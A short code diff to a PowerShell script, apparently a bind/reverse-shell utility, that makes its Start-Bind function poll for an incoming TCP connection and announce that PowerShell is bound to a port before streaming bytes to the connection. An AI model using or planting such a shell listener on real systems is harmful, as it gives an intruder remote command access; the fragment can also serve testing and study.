@@ -86,7 +86,7 @@ Function Start-Listener {
     Write-Host ("Listening on [0.0.0.0] (port " + $Port + ")") -ForegroundColor 'Green'
     While ($true) 
     {
-        
+
         Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
         If ($Socket.Pending()) 
         {
@@ -223,9 +223,27 @@ Function Start-Bind {
         $PortString = $Port.ToString()
         Write-Verbose "Creating listener on port $PortString" 
         $Listener = [System.Net.Sockets.TcpListener]$Port
+        Write-Host "[*] PowerShell.exe is bound to port $PortString" -ForegroundColor "Green"
         $Listener.Start()
-        $Client = $Listener.AcceptTcpClient()
 
+        While ($true) 
+        {
+            
+            Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
+            If ($Listener.Pending()) 
+            {
+            
+                $Client = $Listener.AcceptTcpClient()
+    
+                Break;
+    
+            }  # End If
+    
+            Start-Sleep -Seconds 1
+    
+         }  # End While
+    
+        Write-Host "[*] Connection Established." -ForegroundColor 'Green'
         $Stream = $Client.GetStream()
 
         Write-Verbose "Streaming bytes to PowerShell connection"
